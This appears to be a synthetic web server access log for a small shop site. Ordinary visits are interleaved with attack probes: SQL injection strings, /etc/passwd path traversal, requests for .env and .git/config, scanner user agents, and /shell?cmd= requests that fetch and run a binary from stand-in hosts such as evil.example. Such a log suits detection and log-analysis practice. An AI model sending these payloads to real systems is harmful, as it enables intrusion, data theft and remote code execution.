10.0.0.23 - - [21/May/2026:08:30:56 +0000] "GET /index.html HTTP/1.1" 200 8967 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.10 - - [21/May/2026:13:41:41 +0000] "GET /search?q=laptop HTTP/1.1" 302 443 "https://example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.10 - - [21/May/2026:13:59:17 +0000] "GET /contact HTTP/1.1" 200 7388 "https://example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
203.0.113.12 - - [21/May/2026:14:56:58 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 200 1818 "https://mail.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
91.240.118.172 - - [21/May/2026:14:49:34 +0000] "HEAD /shell?cmd=%77%67%65%74%20http%3A%2F%2Fevil.example%2Fx%20-O%20%2Ftmp%2Fx HTTP/1.1" 401 82 "-" "sqlmap/1.8.3#stable (https://sqlmap.org)"
198.51.100.78 - - [21/May/2026:14:06:27 +0000] "POST /wp-admin/ HTTP/1.1" 404 468 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.11 - - [21/May/2026:11:26:52 +0000] "GET /products/12 HTTP/1.1" 404 125 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.10 - - [21/May/2026:18:03:54 +0000] "GET /contact HTTP/1.1" 200 5000 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
198.51.100.77 - - [21/May/2026:11:34:01 +0000] "GET /phpMyAdmin HTTP/1.1" 404 54 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.10 - - [21/May/2026:17:15:39 +0000] "GET /products/43 HTTP/1.1" 200 8221 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.21 - - [21/May/2026:17:14:28 +0000] "GET /contact HTTP/1.1" 200 5389 "https://yandex.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.11 - - [21/May/2026:17:20:21 +0000] "GET /api/v1/products?page=2 HTTP/1.1" 200 771 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
203.0.113.11 - - [21/May/2026:09:36:45 +0000] "GET /api/v1/status HTTP/1.1" 200 5460 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.24 - - [21/May/2026:12:34:07 +0000] "GET /static/img/logo.png HTTP/1.1" 200 2864 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.22 - - [21/May/2026:11:20:34 +0000] "GET /static/js/app.js HTTP/1.1" 200 5459 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
172.16.0.45 - - [21/May/2026:09:48:32 +0000] "GET /search?q=test%22%20AND%20%28SELECT%201%20FROM%20%28SELECT%28SLEEP%285%29%29%29a%29-- HTTP/1.1" 403 209 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.11 - - [21/May/2026:19:24:34 +0000] "GET /products/12 HTTP/1.1" 200 3497 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.11 - - [21/May/2026:19:42:36 +0000] "GET /contact HTTP/1.1" 200 5985 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.23 - - [21/May/2026:08:07:48 +0000] "GET /search?q=phone HTTP/1.1" 200 1942 "https://yandex.ru/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
198.51.100.78 - - [21/May/2026:13:48:08 +0000] "GET /product?id=1/**/UNION/**/SELECT/**/user,password/**/FROM/**/users HTTP/1.1" 404 663 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.24 - - [21/May/2026:17:38:10 +0000] "GET /products/43 HTTP/1.1" 200 620 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
172.16.0.45 - - [21/May/2026:12:10:28 +0000] "GET /index.php?page=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 200 1446 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.24 - - [21/May/2026:18:43:29 +0000] "GET /about HTTP/1.1" 200 1079 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.13 - - [21/May/2026:17:37:59 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 200 776 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.24 - - [21/May/2026:18:30:07 +0000] "GET /contact HTTP/1.1" 200 8203 "https://mail.example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.21 - - [21/May/2026:19:59:33 +0000] "GET /checkout HTTP/1.1" 200 3064 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.12 - - [21/May/2026:10:28:36 +0000] "GET /products/43 HTTP/1.1" 200 7075 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.11 - - [21/May/2026:11:38:05 +0000] "GET /static/img/logo.png HTTP/1.1" 200 3436 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.21 - - [21/May/2026:16:36:28 +0000] "GET /static/img/logo.png HTTP/1.1" 200 694 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.12 - - [21/May/2026:17:50:45 +0000] "GET /cart HTTP/1.1" 200 7994 "https://yandex.ru/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.12 - - [21/May/2026:09:20:22 +0000] "GET /static/js/app.js HTTP/1.1" 200 527 "https://yandex.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
198.51.100.79 - - [21/May/2026:16:51:15 +0000] "POST /api/v1/login HTTP/1.1" 404 218 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.13 - - [21/May/2026:17:50:42 +0000] "GET /products/43 HTTP/1.1" 200 8554 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
172.16.0.46 - - [21/May/2026:15:28:11 +0000] "GET /api/v1/user?id=1%27%2bOR%2b%271%27%3d%271 HTTP/1.1" 403 1009 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.12 - - [21/May/2026:10:20:33 +0000] "GET /contact HTTP/1.1" 200 775 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.12 - - [21/May/2026:14:42:23 +0000] "GET /cart HTTP/1.1" 200 4127 "https://mail.example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.24 - - [21/May/2026:08:46:05 +0000] "GET / HTTP/1.1" 200 3971 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.13 - - [21/May/2026:08:50:34 +0000] "GET /search?q=phone HTTP/1.1" 200 8129 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.11 - - [21/May/2026:15:06:22 +0000] "GET / HTTP/1.1" 200 6193 "https://example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
91.240.118.172 - - [21/May/2026:17:19:19 +0000] "GET /wp-content/plugins/ HTTP/1.1" 403 1063 "-" "Nmap Scripting Engine; https://nmap.org/book/nse.html"
203.0.113.12 - - [21/May/2026:11:47:05 +0000] "GET /products HTTP/1.1" 200 4919 "https://yandex.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.23 - - [21/May/2026:16:40:52 +0000] "GET /api/v1/products?page=2 HTTP/1.1" 200 2852 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
198.51.100.78 - - [21/May/2026:17:00:57 +0000] "POST /shell?cmd=%77%67%65%74%20http%3A%2F%2Fevil.example%2Fx%20-O%20%2Ftmp%2Fx HTTP/1.1" 403 225 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
91.240.118.172 - - [21/May/2026:12:30:20 +0000] "GET /db.sql HTTP/1.1" 404 1188 "-" "Nikto/2.5.0"
198.51.100.79 - - [21/May/2026:15:03:02 +0000] "GET /.env HTTP/1.1" 404 585 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.13 - - [21/May/2026:18:52:15 +0000] "GET /static/img/logo.png HTTP/1.1" 200 643 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.21 - - [21/May/2026:08:35:49 +0000] "GET /static/img/logo.png HTTP/1.1" 200 2673 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
185.220.101.45 - - [21/May/2026:17:38:13 +0000] "GET /.git/config HTTP/1.1" 403 246 "-" "Hydra"
203.0.113.10 - - [21/May/2026:17:29:31 +0000] "GET /static/css/style.css HTTP/1.1" 200 8728 "https://yandex.ru/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.11 - - [21/May/2026:10:17:38 +0000] "GET /static/css/style.css HTTP/1.1" 200 1674 "https://mail.example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.10 - - [21/May/2026:20:19:57 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 200 8833 "https://example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.23 - - [21/May/2026:16:53:15 +0000] "GET /products/43 HTTP/1.1" 200 2969 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.11 - - [21/May/2026:11:54:52 +0000] "GET /about HTTP/1.1" 200 5926 "https://yandex.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
198.51.100.77 - - [21/May/2026:08:58:46 +0000] "GET /search?q=%27%20OR%20%271%27%3D%271 HTTP/1.1" 404 953 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.22 - - [21/May/2026:11:06:38 +0000] "GET /cart HTTP/1.1" 200 7284 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.13 - - [21/May/2026:16:17:32 +0000] "GET /search?q=laptop HTTP/1.1" 200 5541 "https://mail.example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.23 - - [21/May/2026:12:48:19 +0000] "GET /api/v1/status HTTP/1.1" 200 875 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
198.51.100.77 - - [21/May/2026:18:15:54 +0000] "POST /wp-admin/ HTTP/1.1" 403 224 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
91.240.118.172 - - [21/May/2026:14:33:19 +0000] "GET /admin/login HTTP/1.1" 404 912 "-" "sqlmap/1.8.3#stable (https://sqlmap.org)"
192.168.1.11 - - [21/May/2026:15:24:30 +0000] "GET /api/v1/products?page=2 HTTP/1.1" 200 3005 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
185.220.101.45 - - [21/May/2026:14:05:26 +0000] "GET /server-status HTTP/1.1" 404 274 "-" "Hydra"
172.16.0.44 - - [21/May/2026:10:27:40 +0000] "GET /shell?cmd=%77%67%65%74%20http%3A%2F%2Fevil.example%2Fx%20-O%20%2Ftmp%2Fx HTTP/1.1" 404 338 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.24 - - [21/May/2026:14:02:38 +0000] "GET /contact HTTP/1.1" 200 541 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
198.51.100.79 - - [21/May/2026:15:29:42 +0000] "GET /.env HTTP/1.1" 404 1079 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.13 - - [21/May/2026:16:41:25 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 200 2743 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.23 - - [21/May/2026:10:20:05 +0000] "GET /static/css/style.css HTTP/1.1" 200 2246 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.10 - - [21/May/2026:13:11:24 +0000] "POST /checkout HTTP/1.1" 200 6271 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.23 - - [21/May/2026:14:20:07 +0000] "GET /index.html HTTP/1.1" 200 4705 "https://mail.example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.23 - - [21/May/2026:10:25:35 +0000] "GET /index.html HTTP/1.1" 200 1874 "https://mail.example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
203.0.113.10 - - [21/May/2026:19:34:55 +0000] "GET /checkout HTTP/1.1" 200 3651 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
172.16.0.46 - - [21/May/2026:16:10:05 +0000] "GET /shell?cmd=%77%67%65%74%20http%3A%2F%2Fevil.example%2Fx%20-O%20%2Ftmp%2Fx HTTP/1.1" 404 82 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.13 - - [21/May/2026:08:40:06 +0000] "GET /cart HTTP/1.1" 200 7257 "https://yandex.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.10 - - [21/May/2026:17:33:15 +0000] "GET /search?q=phone HTTP/1.1" 200 5546 "https://yandex.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.21 - - [21/May/2026:09:17:52 +0000] "GET / HTTP/1.1" 200 5927 "https://yandex.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.22 - - [21/May/2026:18:49:18 +0000] "GET /api/v1/products?page=2 HTTP/1.1" 302 212 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.24 - - [21/May/2026:16:00:42 +0000] "GET /products/43 HTTP/1.1" 200 2776 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.24 - - [21/May/2026:14:12:04 +0000] "POST /checkout HTTP/1.1" 200 7960 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.10 - - [21/May/2026:17:14:09 +0000] "GET /api/v1/products?page=2 HTTP/1.1" 200 2308 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.22 - - [21/May/2026:12:12:29 +0000] "GET /cart HTTP/1.1" 200 4579 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.13 - - [21/May/2026:18:57:38 +0000] "GET /static/img/logo.png HTTP/1.1" 200 5455 "https://mail.example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.10 - - [21/May/2026:20:21:10 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 200 2876 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
198.51.100.79 - - [21/May/2026:15:49:51 +0000] "GET /phpMyAdmin HTTP/1.1" 200 8732 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
91.240.118.172 - - [21/May/2026:17:39:32 +0000] "GET /administrator HTTP/1.1" 401 851 "-" "WPScan v3.8.25"
45.155.205.33 - - [21/May/2026:13:59:10 +0000] "GET /phpmyadmin HTTP/1.1" 200 8367 "-" "Nikto/2.5.0"
10.0.0.21 - - [21/May/2026:12:20:04 +0000] "GET /products HTTP/1.1" 200 6814 "https://mail.example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.11 - - [21/May/2026:12:30:27 +0000] "GET /search?q=phone HTTP/1.1" 200 4730 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.10 - - [21/May/2026:16:52:12 +0000] "GET /contact HTTP/1.1" 200 1165 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
198.51.100.78 - - [21/May/2026:20:09:37 +0000] "POST /api/v1/user?id=1%27%2bOR%2b%271%27%3d%271 HTTP/1.1" 403 792 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
185.220.101.45 - - [21/May/2026:11:31:59 +0000] "HEAD /wp-login.php HTTP/1.1" 500 27 "-" "WPScan v3.8.25"
10.0.0.22 - - [21/May/2026:09:30:32 +0000] "GET /search?q=laptop HTTP/1.1" 200 5701 "https://yandex.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.12 - - [21/May/2026:15:39:19 +0000] "GET /api/v1/products?page=2 HTTP/1.1" 200 5297 "https://example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.24 - - [21/May/2026:08:30:41 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 200 4900 "https://mail.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.11 - - [21/May/2026:09:10:01 +0000] "GET /products/43 HTTP/1.1" 404 1149 "https://mail.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
198.51.100.77 - - [21/May/2026:08:56:43 +0000] "POST /shell?cd+/tmp;wget+http://malicious.example/bin;chmod+777+bin;./bin HTTP/1.1" 403 911 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
185.220.101.45 - - [21/May/2026:16:55:57 +0000] "GET /index.php?page=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 403 206 "-" "ffuf/2.1.0"
203.0.113.11 - - [21/May/2026:08:51:04 +0000] "GET /api/v1/user/profile HTTP/1.1" 200 6106 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.12 - - [21/May/2026:15:56:05 +0000] "GET /products/43 HTTP/1.1" 302 582 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.10 - - [21/May/2026:09:47:54 +0000] "GET /products HTTP/1.1" 200 3319 "https://yandex.ru/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.23 - - [21/May/2026:08:30:18 +0000] "GET /products/12 HTTP/1.1" 200 2025 "https://yandex.ru/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.21 - - [21/May/2026:19:44:48 +0000] "POST /checkout HTTP/1.1" 200 2963 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
198.51.100.77 - - [21/May/2026:11:50:10 +0000] "GET /phpMyAdmin HTTP/1.1" 403 1101 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
45.155.205.33 - - [21/May/2026:15:44:56 +0000] "POST /wp-admin/ HTTP/1.1" 404 431 "-" "Nikto/2.5.0"
192.168.1.11 - - [21/May/2026:11:30:27 +0000] "GET /products/43 HTTP/1.1" 200 4684 "https://mail.example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.11 - - [21/May/2026:09:14:33 +0000] "GET /api/v1/status HTTP/1.1" 200 1099 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.21 - - [21/May/2026:18:56:09 +0000] "GET /about HTTP/1.1" 200 2626 "https://yandex.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
172.16.0.45 - - [21/May/2026:16:30:08 +0000] "GET /product?id=1%20UNION%20SELECT%201,2,3-- HTTP/1.1" 404 393 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.22 - - [21/May/2026:13:06:47 +0000] "GET /api/v1/user/profile HTTP/1.1" 200 7073 "https://yandex.ru/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
198.51.100.77 - - [21/May/2026:09:59:21 +0000] "POST /.git/config HTTP/1.1" 302 483 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.12 - - [21/May/2026:09:11:15 +0000] "GET /static/js/app.js HTTP/1.1" 200 8033 "https://mail.example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.10 - - [21/May/2026:14:22:08 +0000] "GET /search?q=phone HTTP/1.1" 200 2936 "https://yandex.ru/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.11 - - [21/May/2026:08:26:40 +0000] "GET / HTTP/1.1" 200 1152 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
203.0.113.12 - - [21/May/2026:14:12:19 +0000] "GET /contact HTTP/1.1" 200 1670 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.13 - - [21/May/2026:18:58:23 +0000] "GET /search?q=laptop HTTP/1.1" 200 1306 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.10 - - [21/May/2026:12:31:23 +0000] "GET /static/js/app.js HTTP/1.1" 200 1208 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.10 - - [21/May/2026:08:19:17 +0000] "GET /about HTTP/1.1" 200 8234 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.23 - - [21/May/2026:10:09:49 +0000] "GET /about HTTP/1.1" 200 2755 "https://yandex.ru/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
